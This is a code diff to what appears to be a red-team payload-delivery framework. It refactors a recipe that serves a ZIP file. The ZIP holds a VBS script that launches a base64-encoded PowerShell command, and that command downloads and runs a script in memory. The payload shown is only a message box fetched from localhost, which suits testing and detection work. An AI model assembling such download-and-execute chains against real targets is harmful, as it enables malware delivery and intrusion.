@@ -4,7 +4,7 @@ from make.iso.iso import makeIso
 from make.powershell.powershell import *
 from make.zip.zip import makeZip
 from make.vbs.vbs import *
-from make.mshta.mshta import *
+from make.hta.hta import *
 from make.onenote.onenote import *
 from make.bat.bat import *
 
@@ -17,25 +17,26 @@ def recipe_2():
     # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
     routes = []
 
-    # PS-A
-    ps1msgbox: AceStr = makePowershellMessageBox()
-    ps1msgboxHtml: AceRoute = AceRoute('/ps-msgbox', ps1msgbox)
-    routes.append(ps1msgboxHtml)
+    # PS MessageBox
+    psScript: AceStr = makePsScriptMessagebox()
+    psFile: AceRoute = AceRoute('/ps-msgbox', psScript)
+    routes.append(psFile)
 
-    # PS-B
-    ps1downloader: AceStr = makePowershellDownloadAndExecuteMemPs1(
+    # PS Download & Execute
+    psCommand: AceStr = makePsScriptFromPsCommandByDownloadMem(
         url='http://localhost:5000/ps-msgbox',
     )
+    psEncodedCommand: AceStr = makePsEncodedCommand(psCommand)
 
     # VBS
-    ps1downloader: AceStr = makePowershellEncodedCommand(ps1downloader)
-    vbsExec: AceStr = makeVbsExecEncPs1(ps1downloader)
-    vbsExecFile: AceFile = makeAceFile('test.vbs', vbsExec)
+    cmd: AceStr = AceStr("powershell -EncodedCommand \"{}\"".format(psEncodedCommand))
+    vbs: AceStr = makeVbsFromCmdByWscript(cmd)
+    vbsFile: AceFile = makeAceFile('test.vbs', vbs)
 
     # ZIP
     container: AceBytes = makeZip(
         files = [
-            vbsExecFile,
+            vbsFile,
         ],
     )
     containerServe: AceRoute = AceRoute('/test.zip', container, download=True, downloadName='test.zip')
